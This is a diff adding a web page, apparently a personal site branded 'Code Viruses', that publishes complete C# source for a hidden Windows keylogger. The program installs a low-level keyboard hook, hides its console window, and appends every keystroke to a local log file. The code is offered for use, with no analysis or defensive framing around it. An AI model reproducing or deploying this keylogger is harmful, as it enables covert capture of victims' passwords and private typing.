@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html  >
+<head>
+  <!-- Site made with Mobirise Website Builder v5.7.8, https://mobirise.com -->
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Mobirise v5.7.8, mobirise.com">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+  <link rel="shortcut icon" href="assets/images/nowy-projekt-96x96.png" type="image/x-icon">
+  <meta name="description" content="">
+  
+  
+  <title>code</title>
+  <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
+  <link rel="stylesheet" href="assets/dropdown/css/style.css">
+  <link rel="stylesheet" href="assets/socicon/css/styles.css">
+  <link rel="stylesheet" href="assets/theme/css/style.css">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap"></noscript>
+  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
+
+  
+  
+  
+</head>
+<body>
+  
+  <section data-bs-version="5.1" class="menu menu2 cid-tvRzF1EzhA" once="menu" id="menu2-9">
+    
+    <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
+        <div class="container">
+            <div class="navbar-brand">
+                <span class="navbar-logo">
+                    <a href="mailto:o.curiosus@gmail.com">
+                        <img src="assets/images/nowy-projekt-96x96.png" alt="" style="height: 3rem;">
+                    </a>
+                </span>
+                <span class="navbar-caption-wrap"><a class="navbar-caption text-black display-7" href="https://mobiri.se">Code Viruses</a></span>
+            </div>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbarSupportedContent" data-bs-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+                <div class="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav nav-dropdown" data-app-modern-menu="true"><li class="nav-item"><a class="nav-link link text-black display-4" href="https://mobiri.se"><span class="mobi-mbri mobi-mbri-phone mbr-iconfont mbr-iconfont-btn"></span>Help</a>
+                    </li></ul>
+                
+                <div class="navbar-buttons mbr-section-btn"><a class="btn btn-primary display-4" href="https://discord.gg/fYRycEmyEm"><span class="mobi-mbri mobi-mbri-rocket mbr-iconfont mbr-iconfont-btn"></span>Discord</a></div>
+            </div>
+        </div>
+    </nav>
+</section>
+
+<section data-bs-version="5.1" class="content4 cid-tvRUh8BLSa" id="content4-a">
+    
+
+    
+    
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="title col-md-12 col-lg-10">
+                <h3 class="mbr-section-title mbr-fonts-style align-center mb-4 display-2"><strong>Code by sttikoo</strong></h3>
+                <h4 class="mbr-section-subtitle align-center mbr-fonts-style mb-4 display-5">🛒</h4>
+                
+            </div>
+        </div>
+    </div>
+</section>
+
+<section data-bs-version="5.1" class="content5 cid-tvRUrhYmHG" id="content5-b">
+    
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-md-12 col-lg-10">
+                
+                <h4 class="mbr-section-subtitle mbr-fonts-style mb-4 display-5"><strong><em>Code</em></strong>⬇️<br><br></h4>
+                <p class="mbr-text mbr-fonts-style display-7">using System;
+<br>using System.Diagnostics;
+<br>using System.Windows.Forms;
+<br>using System.Runtime.InteropServices;
+<br>using System.IO;
+<br> 
+<br>class InterceptKeys
+<br>{
+<br>    private const int WH_KEYBOARD_LL = 13;
+<br>    private const int WM_KEYDOWN = 0x0100;
+<br>    private static LowLevelKeyboardProc _proc = HookCallback;
+<br>    private static IntPtr _hookID = IntPtr.Zero;
+<br> 
+<br>    public static void Main()
+<br>    {
+<br>        var handle = GetConsoleWindow();
+<br> 
+<br>        // Hide
+<br>        ShowWindow(handle, SW_HIDE);
+<br> 
+<br>        _hookID = SetHook(_proc);
+<br>        Application.Run();
+<br>        UnhookWindowsHookEx(_hookID);
+<br> 
+<br>    }
+<br> 
+<br>    private static IntPtr SetHook(LowLevelKeyboardProc proc)
+<br>    {
+<br>        using (Process curProcess = Process.GetCurrentProcess())
+<br>        using (ProcessModule curModule = curProcess.MainModule)
+<br>        {
+<br>            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+<br>                GetModuleHandle(curModule.ModuleName), 0);
+<br>        }
+<br>    }
+<br> 
+<br>    private delegate IntPtr LowLevelKeyboardProc(
+<br>        int nCode, IntPtr wParam, IntPtr lParam);
+<br> 
+<br>    private static IntPtr HookCallback(
+<br>        int nCode, IntPtr wParam, IntPtr lParam)
+<br>    {
+<br>        if (nCode &gt;= 0 &amp;&amp; wParam == (IntPtr)WM_KEYDOWN)
+<br>        {
+<br>            int vkCode = Marshal.ReadInt32(lParam);
+<br>            Console.WriteLine((Keys)vkCode);
+<br>            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
+<br>            sw.Write((Keys)vkCode);
+<br>            sw.Close();
+<br>        }
+<br>        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+<br>    }
+<br> 
+<br>    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+<br>    private static extern IntPtr SetWindowsHookEx(int idHook,
+<br>        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+<br> 
+<br>    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+<br>    [return: MarshalAs(UnmanagedType.Bool)]
+<br>    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+<br> 
+<br>    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+<br>    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+<br>        IntPtr wParam, IntPtr lParam);
+<br> 
+<br>    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+<br>    private static extern IntPtr GetModuleHandle(string lpModuleName);
+<br> 
+<br>    [DllImport("kernel32.dll")]
+<br>    static extern IntPtr GetConsoleWindow();
+<br> 
+<br>    [DllImport("user32.dll")]
+<br>    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+<br> 
+<br>    const int SW_HIDE = 0;
+<br> 
+<br>}</p>
+            </div>
+        </div>
+    </div>
+</section><section class="display-7" style="padding: 0;align-items: center;justify-content: center;flex-wrap: wrap;    align-content: center;display: flex;position: relative;height: 4rem;"><a href="https://mobiri.se/2932815" style="flex: 1 1;height: 4rem;position: absolute;width: 100%;z-index: 1;"><img alt="" style="height: 4rem;" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="></a><p style="margin: 0;text-align: center;" class="display-7">Built with &#8204;</p><a style="z-index:1" href="https://mobirise.com/offline-website-builder.html">Offline Website Builder</a></section><script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>  <script src="assets/smoothscroll/smooth-scroll.js"></script>  <script src="assets/ytplayer/index.js"></script>  <script src="assets/dropdown/js/navbar-dropdown.js"></script>  <script src="assets/theme/js/script.js"></script>  
+  
+  
+</body>
+</html>
